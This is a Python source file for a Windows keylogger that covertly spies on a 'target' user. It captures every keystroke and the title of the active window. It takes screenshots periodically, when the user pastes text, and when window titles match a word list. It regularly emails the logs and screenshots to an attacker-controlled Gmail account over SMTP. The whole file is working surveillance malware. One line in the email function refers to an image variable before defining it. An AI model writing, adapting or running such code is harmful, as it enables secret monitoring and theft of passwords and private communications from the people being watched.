import os
import shutil
import time
from datetime import datetime
import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from threading import Semaphore, Timer, Event
from PIL import ImageGrab, Image
import win32gui
from config import fromAddr, fromPswd


date = time.ctime(time.time())
SEND_REPORT_EVERY = 20 # 10 minutes is 600 
TAKE_SCREENSHOT_EVERY = SEND_REPORT_EVERY / 4
EMAIL_ADDRESS = fromAddr
EMAIL_PASSWORD = fromPswd

class Keylogger:
    def __init__(self, interval): #, scinterval):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval`
        self.log = ""
        self.old_app = ''
        # for blocking after setting the on_release listener
        self.semaphore = Semaphore(0)
        # set the event that will block the screenshotting process while sending e-mail (else oncreasingly longer mail each loop)
        self.is_sending = Event()
        # remove the screenshots folder to start over each time script is run
        if os.path.exists('screenshots'):
            shutil.rmtree('screenshots')

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is pressed in this example)
        """
        new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())

        if new_app == 'Cortana':
            new_app = 'Windows Start Menu'
        else:
            pass
        
        sensible_words = []
        
        if any(ext in new_app for ext in sensible_words): # Screenshot when current window name contains any of the sensible_words (chosse which ones)
            self.s_screenshot('window')

        if new_app != self.old_app and new_app != '' and new_app != 'Task Switching':
            self.log += f'\n[{date}] ~ {new_app}\n'
            self.old_app = new_app
        else:
            pass

        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        
        if name == 'v' and self.log.endswith('[CTRL]'): # takes a screenshot when target pastes text in an attempt to catch information that isn't typed
            self.s_screenshot('paste')

        # If target presses backspace remove last character in self.log except if its a special key 
        if name == '[BACKSPACE]' and self.log[-1] != ']':
            self.log = self.log[:-1]
        elif self.log.endswith(name) and name in ['[CTRL]', '[RIGHT_SHIFT]']:
            name = ''
        else:
            #print(name)
            self.log += name # Add character to self.log
    

    def sendmail(self, email, password, message):
        self.is_sending.set() # Sets Event to stop screenshotting process

        # Prepare email to be sent
        msg = MIMEMultipart()
        msg['Subject'] = f'{self.time.strftime("%D %T")} logs'

        text = MIMEText(message)
        msg.attach(text)

        # Attaches all images in screenshots and then removes them
        for file in os.listdir('screenshots'):
            filename = os.fsdecode(file)
            if filename.endswith('png'):
                img_c = Image.open(f'screenshots/{filename}')
                img_c = img.resize((1920,1080), Image.LANCZOS)
                img_c.save(f'screenshots/{filename}', optimize=True, quality=85)
                
                img_data = open(f'screenshots/{filename}', 'rb').read()
                img = MIMEImage(img_data, name=filename)
                msg.attach(img)
                os.remove(f'screenshots/{filename}')
        # os.rmdir('screenshots')

        # manages a connection to an SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.ehlo()
        server.starttls()
        server.ehlo()
        # login to the email account
        server.login(email, password)
        # send the actual message
        server.sendmail(email, email, msg.as_string())
        # terminates the session
        server.quit()

        self.is_sending.clear() # Restarts the screenshotting process


    def s_screenshot(self, action): # simple screenshot (no loop)
        self.time = datetime.now()
        # print(f'{self.time.strftime("%D %T")} logs')
        self.filename = f'{self.time.strftime("%H-%M-%S")}-{action}.png'
        self.filelocation = f'screenshots/{self.filename}'

        self.screen = ImageGrab.grab()
        self.screen.save(self.filelocation)


    def screenshot(self):
        if not os.path.exists('screenshots'): # creates screenshot folder if it doesn't exist already
            os.mkdir('screenshots')
        else:
            time.sleep(TAKE_SCREENSHOT_EVERY)
        
        self.time = datetime.now()
        # print(f'{self.time.strftime("%D %T")} logs')
        self.filename = f'{self.time.strftime("%H-%M-%S")}.png'
        self.filelocation = f'screenshots/{self.filename}'
        
        self.screen = ImageGrab.grab()
        self.screen.save(self.filelocation)
        
        while self.is_sending.is_set():
            time.sleep(1)
    
        self.screenshot()


    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            print('[*] Sending email')
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            print('[+] Email sent')
            # can print to a file, whatever you want
            # print(self.log)
        self.log = ""

        Timer(interval=self.interval, function=self.report).start()


    def start(self):
        # start the keylogger
        keyboard.on_press(callback=self.callback) # keyboard.on_release(callback=self.callback)
        # start reporting the keylogs           
        self.report()
        self.screenshot()
        # block the current thread,
        # since on_release() doesn't block the current thread
        # if we don't block it, when we execute the program, nothing will happen
        # that is because on_release() will start the listener in a separate thread
        self.semaphore.acquire()


if __name__ == "__main__": # Sart script
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()
